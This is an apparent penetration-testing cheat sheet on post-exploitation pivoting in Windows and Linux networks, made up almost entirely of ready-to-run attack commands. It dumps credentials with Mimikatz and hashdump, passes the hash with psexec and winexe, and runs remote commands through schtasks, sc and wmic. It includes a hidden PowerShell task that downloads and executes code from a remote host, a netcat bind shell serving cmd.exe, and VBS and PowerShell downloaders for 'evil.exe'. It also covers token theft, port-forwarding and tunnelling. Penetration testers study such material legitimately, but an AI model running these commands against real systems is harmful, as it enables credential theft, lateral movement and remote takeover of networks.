---
title: Pivot
category: Post-Exploitation
order: 97
---

> **WINDOWS Remote Commands with Creds or Hash** 

**Example Hash**

{% highlight bash %} admin:500:NO PASSWORD*********************:6F403D3166024568403A94C3A6561896::: {% endhighlight %}

**Get Passwords and Hashes***

Get Plain Text Passwords and Hashes | <code> see below</code>
Get Plain Text Passwords and Hashes | <code> meterpreter>  load kiwi </br> meterpreter > creds_all </code>
Get Hashes | <code> msf > use post/windows/gather/smart_hashdump <br> meterpreter> hashdump  </code>
Get Hashes | <code> pwdump, fgdump, windows credential editor </code>
Phish Creds | <code> msf > use post/windows/gather/phish_windows_credentials </code>

**Mimikatz***

{% highlight bash %}
\\get architecture
C:\beachead>SET Processor
\\Run correct mimikatz
C:\beachead>mimikatz32.exe
\\Obtain debug permissions
mimikatz # privilege::debug
\\log actions
mimikatz # log
\\Try and get logonpasswords
mimikatz # sekurlsa::logonpasswords
\\ dump all Active Directory domain credentials from a Domain Controller
mimikatz # LSADUMP::LSA /inject
\\Dump Hashes
mimikatz # LSADUMP::SAM
\\List Tokens
mimikatz # TOKEN::List
\\Get tickets
mimikatz # SEKURLSA::Tickets
{% endhighlight %}

References:
http://archive.is/AFaN7#selection-3919.4-3919.76
https://archive.is/mQcmN#selection-1568.1-190.7
https://labs.mwrinfosecurity.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/
https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/

**Find Computers to pivot to** 

Find Computer to Pivot to | <code> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname <br> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname </code>

**Pre-pivot check**

Get Defensive Tech | <code> wmic /node:[box] process list </code>
psexec (requires install, creates service on target) | <code> psexec \\[tartgetIP] [-d] [-u user]  [-p password] [command] [-s for system] [-d for disconnected like netcat] </code>

**Windows: Pass the Hash**

{% highlight bash %}
#Remote shell on a box
#export the password hash except the "no password" is replaced with an empty LM hash
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U administrator% //192.168.31.233 cmd
#or with passwords
winexe -U administrator%password //127.0.0.1 "cmd" 

***May require RID 500 account due to patch*** 

# Metasploit psexec
use exploit/windows/smb/psexec <br> set RHOST [victim] <br> set PAYLOAD windows/meterpreter/reverse_tcp 
set SMBUser [admin_name] 
set SMBPass [admin_hash] 
exploit

#Nmap nse smb tbd
#WCE tbd
{% endhighlight %}

**Windows with Passwords**

Metasploit  psexec (writes executable, creates a service with system privs, automatically removes service and executable) | <code> msf > use exploit/windows/smb/psexec <br> msf > set PAYLOAD [payload] <br> msf > set RHOST [tartget] <br> msf > set SMBUser [admin_username] <br> msf > set SMBPass [admin_password_or_hash] </code>
at <br> windows 7 and lower <br> all commands at SYSTEM | <code> net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> #if it isnt running <br> sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*)" </code> 
schtasksStart | Time - HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE <br> <code> net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> schtasks /creat /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency]  /st [starttime] /sd [startdate] /tr [command] <br> schtasks /query /s [targetIP]" </code>
SC - Runs as SYSTEM | <code> sc \\[targetIP] create netcat binpath= ""cmd.exe /k c:\tools\nc.exe -L -p cmd.exe <br> sc \\[targetIP] start netcat </code>
Metasploit schtasks | <code> meterpreter> run schtasksabuse -c "[command1][,command2].." -t [target IP] </code>
WMIC Invoke Porgram Runs as Admin User | <code> wmic /node:[targetIP] /user:[admin_user] /password:[password] process call create [command] </code>
WMIC on Multiple Machines | <code> /node:@[filename] <br> run a command on multiple machines listed in a file </code>

>**Windows without creds**

{% highlight bash %}
> whoami or sets
> net user [username] /domain

#Steal a Token
meterpreter > use incognito
cobalt strike > Explore Processes and Steal Token
incognito > incognito.exe list_tokens -u
incognito > incognito.exe execute -c domain\user "command"

#Find privs of token
net user [username] /domain

#Find Computer to Pivot To
> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname

#Look for defensive technologies
> wmic /node:[box] process list

#An executable or bat file
> net use \\WIN-K5QAGP4CM7V\C$
> copy C:\wamp64\bin\php\payload.exe \\WIN-K5QAGP4CM7V\C$\Users\PUblic\Music\payload.exe
> wmic /node:"WIN-K5QAGP4CM7V" process call create "C:\Users\PUblic\Music\payload.exe"

#WMIC and Powershell
> wmic /node:"WIN-K5QAGP4CM7V" process call create "powershell.exe -nop -w hidden -encodedcommand [encodedcommand]"

#Scheduled Task and Powershell
> schtasks /create /tn ScoreBoard /s 10.4.0.100 /tr "C:\windows\system32\WindowsPowerShell\V1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.128.0.11:8000/page'''))'" /sc MINUTE /st 12:53
{% endhighlight %}

>**Pivoting and Port Forwarding**

**Metasploit and Meterpreter**

{% highlight bash %}
#Adding a route
meterpreter> ipconfig 
Broadcom 440x 10/100 Integrated Controller - Packet Scheduler Miniport
Hardware MAC: 00:0b:db:1d:d3:2b
IP Address : 192.168.15.3
Netmask : 255.255.255.0

meterpreter > run arp_scanner -r 192.168.15.1/24
[*] ARP Scanning 192.168.15.1/24
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff

msf > route add 192.168.15.1 255.255.255.0 1

msf exploit(handler) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set RHOSTS 192.168.15.1
RHOSTS => 192.168.15.1
msf auxiliary(tcp) > set PORTS 1-1024
PORTS => 1-1024

#Socks Proxy
msf auxiliary(tcp) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options
msf auxiliary(socks4a) > set SRVHOST 159.203.173.82
SRVHOST => 159.203.173.82
msf auxiliary(socks4a) > run

#Port forward SMB
meterpreter> portfwd add -l 445 -p 445 -r 10.7.0.22
#Port forward RDP
meterpreter> portfowd add -l 2289 -p 3389 -r 10.7.0.22
{% endhighlight %}

* Proxy Chain Configuration:

{% highlight bash %}
vi /etc/proxychains.conf 
#comment out DNS
#Change sock4 to:
socks4 [IP of Attack Machine] [PORT of attach machine]

proxychains nmap -sT -P0 10.0.0.10

{% endhighlight %}

**rinetd port forward**

{% highlight bash %}
nano /etc/rinetd.conf
#add forwarding rules
#bindaddress(local public IP) bindport(local public port)  connectaddress  connectport
208.88.127.99 80  57.23.72.109  3389
/etc/init.d/rinetd restart

#connect to the proxy (208.88.127.99:80)
{% endhighlight %}

**ssh local and remote port forwarding**

{% highlight bash %}
#Local Port forwarding
ssh [gateway] -L [Localport]:[remotehost]:[remoteport]
victim [ssh...]  -> attacker gateway [rnetd 53] -> attacker remote host [80]

#Remote Port Forwarding - Expose blocked local port to attacker
#Example uses plink.exe for ssh on windows:
#https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
ssh [gateway] -R [RemotePort]:[localhost]:[localport]
plink -l root -pw ubersecretpasword 208.88.127.99 -R  3390[attacking machine] :127.0.0.1:3389[localport on victim]
ssh abcd -p 53 -R 3900:127.0.0.1:3389
rdesktop 127.0.0.1:3390 -u Administrator -p password -d domain
victim [ssh...][rdp 3389] -> attacker[RDP 3390][rdesktop 127.0.0.1:3390]
{% endhighlight %}

{% highlight bash %}
#Dynamic port forwarding
#Create Local Socks4 Proxy on attacking machine
ssh -D 8080 root@admin.megacorpone.com

#Setup Proxychains
nano /etc/proxychains.com
socks4  127.0.0.1 8080

#Use Proxy Chains
proxychains namap -p 2289 -sT -Pn 12.16.40.18.22 --open

{% endhighlight %}

**Netcat Relay** 

Relay | <code> Mknod backpipe p <br> nc -l -p [allowed_inbound_port] 0<backpipe | nc 127.0.0.1 22 1>backpipe <br> ssh login@[target] -p [allowed_inbound_port] </code>
Remote Netcat (detached) | <code> nc.exe -d -l -p 4444 -e cmd.exe </code>

**netsh pivot** 

{% highlight bash %}
netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>
  
\\web example on port 80 
netsh interface portproxy add v4tov4 listenport=49162 listenaddress=0.0.0.0 connectport=80 connectaddress=10.1.1.223
{% endhighlight %}
  
> **Downloading Files Linux** 

TFTP (Kali) | <code> mkdir /tftp && aftpd --daemon --port 69 /tftp </code>
TFTP (victim) | <code> tftp 173.32.52.12 -c get MyFile1.txt </code>
FTP (Kali) | Install Pure FTP (see Install Tools)
FTP (victim) | <code> wget ftp://user:password@192.168.1.2/path/file.ext  </code>

> **Downloading Files Windows** 

TFTP (Kali) | <code> mkdir /tftp && aftpd --daemon --port 69 /tftp </code>
TFTP (victim - win xp and 2003) | <code> tftp -i 192.168.1.3 GET nc.exe </code>
FTP | <code> echo open^ 192.168.1.2^ 21  > ftp.txt && echo USER^ ftpuser >> ftp.txt && echo ftp >> ftp.txt && echo bin >> ftp.txt && echo GET^ file.exe >> ftp.txt && echo bye | ftp -v -n -s:ftp.txt </code>

> **FTP beachead - Windows

{% highlight bash %}
mkdir C:\beachead && echo open 10.11.0.216 21 > C:\beachead\ftp.txt && echo USER ftpuser password123 >> C:\beachead\ftp.txt && echo bin >> C:\beachead\ftp.txt && echo lcd C:\beachead >> C:\beachead\ftp.txt && echo GET find_token.exe >> C:\beachead\ftp.txt && echo GET incognito.exe >> C:\beachead\ftp.txt && echo GET incognito_service.exe >> C:\beachead\ftp.txt && echo GET nc.exe >> C:\beachead\ftp.txt && echo GET mimidrv32.sys >> C:\beachead\ftp.txt && echo GET mimikatz32.exe >> C:\beachead\ftp.txt && echo GET mimilib32.dll >> C:\beachead\ftp.txt && echo GET mimilove32.exe >> C:\beachead\ftp.txt && echo GET mimidrv64.sys >> C:\beachead\ftp.txt && echo GET mimikatz64.exe >> C:\beachead\ftp.txt && echo GET mimilib64.dll >> C:\beachead\ftp.txt && echo GET J_WRS.exe >> C:\beachead\ftp.txt && echo bye >> C:\beachead\ftp.txt >> C:\beachead\ftp.txt && ftp -v -n -s:C:\beachead\ftp.txt
{% endhighlight %}

**Download with VBS**
{% highlight bash %}
note: need to insert escapes (^)
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs 
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo  http.Open "GET", strURL, False >> wget.vbs echo  http.Send >> wget.vbs 
echo  varByteArray = http.ResponseBody >> wget.vbs 
echo  Set http = Nothing >> wget.vbs echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo  strData = "" >> wget.vbs echo  strBuffer = "" >> wget.vbs 
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo  Next >> wget.vbs 
echo  ts.Close >> wget.vbs

cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
{% endhighlight %}

**Download with Powershell**
{% highlight bash %}
echo $storageDir = $pwd > wget.ps1 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1 
echo $file = "new-exploit.exe" >>wget.ps1 
echo $webclient.DownloadFile($url,$file) >>wget.ps1 
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive NoProfile -File wget.ps1 
{% endhighlight %}

**Debug.exe for exes or dlls** 
{% highlight bash %}
#On Kali
locate [exe to transfer]
#ensure that it is less than 64k
ls -l [file to transfer}
#pack the executable
upx -9 [file to transfer]
#Run file to bat
locate exe2bat
wine exe2bat.exe [file.exe] [file.txt]

#on victim and paste commands from file.txt
{% endhighlight %}

> **HTTP Tunnel**

[HTTP Tunnel](https://tools.kali.org/maintaining-access/httptunnel)

{% highlight bash %}
#As administrator perform the following:
netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes
netsh advfirewall firewall add rule name="3000" dir =in action=allow protocol=TCP localport=3000
netsh advfirewall firewall add rule name="1080" dir in action=allow protocol=TCP localport=1079
httptunnel_client.exe
{% endhighlight %}

> **Other Tunneling Tools**
* [stunnel](https://www.stunnel.org/)


> **useful resources** 

* [mimikatz](https://github.com/gentilkiwi/mimikatz)
* [powershell mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)
* [incognito](https://labs.mwrinfosecurity.com/tools/incognito/)
* [powershell token](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1)
* [SSH Cheat Sheet](http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet)
* [Meterpreter Pivot](https://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot)
* [Nessus through Proxy](https://blog.elearnsecurity.com/nessus-and-metasploit-scan-networks-in-pivoting.html)
* [SSH Pivot](http://pwnwiki.io/#!pivoting/linux/index.md)


